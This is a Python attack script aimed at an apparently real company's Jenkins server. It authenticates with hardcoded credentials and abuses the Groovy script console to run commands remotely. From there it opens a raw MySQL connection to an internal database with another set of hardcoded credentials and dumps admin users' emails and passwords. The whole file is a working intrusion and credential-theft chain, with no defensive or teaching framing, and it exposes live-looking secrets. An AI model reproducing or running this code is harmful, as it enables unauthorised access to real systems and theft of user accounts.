import requests
import urllib3
urllib3.disable_warnings()

JENKINS_URL = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

session = requests.Session()
session.auth = (USER, PASS)
session.verify = False

# Get crumb
crumb_url = f"{JENKINS_URL}/crumbIssuer/api/json"
r = session.get(crumb_url, timeout=30)
print(f"[*] Crumb request: {r.status_code}")
if r.status_code != 200:
    print(f"    Body: {r.text[:500]}")
    raise SystemExit("Failed to get crumb")

crumb_data = r.json()
crumb_field = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[*] Crumb: {crumb_field}={crumb_value}")

GROOVY = r'''
def r = ["bash","-c","""python -c "
import sys,socket,struct,hashlib
reload(sys);sys.setdefaultencoding('utf-8')
HOST='172.27.141.6';PORT=3308;USER='apifincadodev';PASS='1q2w3e4r5t6y'
s=socket.socket();s.settimeout(20);s.connect((HOST,PORT))
d=b''
while True:
 ch=s.recv(4096)
 if not ch:break
 d+=ch
 if len(d)>=4:
  pl=ord(d[0])+(ord(d[1])<<8)+(ord(d[2])<<16)
  if len(d)>=pl+4:break
i=5
while ord(d[i:i+1])!=0:i+=1
i+=1
tid=struct.unpack('<I',d[i:i+4])[0];i+=4
salt1=d[i:i+8];i+=9
caps=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=1
status=struct.unpack('<H',d[i:i+2])[0];i+=2
caps2=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=11
salt2=d[i:i+12]
salt=salt1+salt2
p1=hashlib.sha1(PASS).digest()
p2=hashlib.sha1(p1).digest()
p3=hashlib.sha1(salt+p2).digest()
xor=bytearray(20)
for j in range(20):xor[j]=ord(p1[j])^ord(p3[j])
capf=0x0003f7cf
pkt=struct.pack('<I',capf)+struct.pack('<I',1<<24)+chr(33)+chr(0)*23+USER+chr(0)+chr(20)+str(bytes(xor))+'admonplaza'+chr(0)
s.send(struct.pack('<I',len(pkt))[:3]+chr(1)+pkt)
r2=s.recv(4096)
if ord(r2[4])!=0:
 print('AUTH FAIL');sys.exit(1)
print('AUTH OK')
def q(sk,sql):
 d=sql.encode('utf-8')
 sk.send(struct.pack('<I',len(d)+1)[:3]+chr(0)+chr(3)+d)
 r=b''
 import time;time.sleep(0.5)
 while True:
  try:
   ch=sk.recv(65536)
   if not ch:break
   r+=ch
   if len(ch)<65536:break
  except:break
 return r
# Get admin users with passwords
raw=q(s,'SELECT Id,correo,Contrasena,Nombre,ApPaterno FROM admonplaza.usr_usuarios ORDER BY Id LIMIT 50')
print repr(raw[:5000])
s.close()
" 2>&1"""].execute().text
println r
'''

# Execute Groovy script
exec_url = f"{JENKINS_URL}/scriptText"
headers = {crumb_field: crumb_value}
data = {"script": GROOVY}

print(f"[*] Executing Groovy on {exec_url}...")
r = session.post(exec_url, headers=headers, data=data, timeout=60)
print(f"[*] Response: {r.status_code} ({len(r.text)} bytes)")
print("=" * 80)
print(r.text)
print("=" * 80)
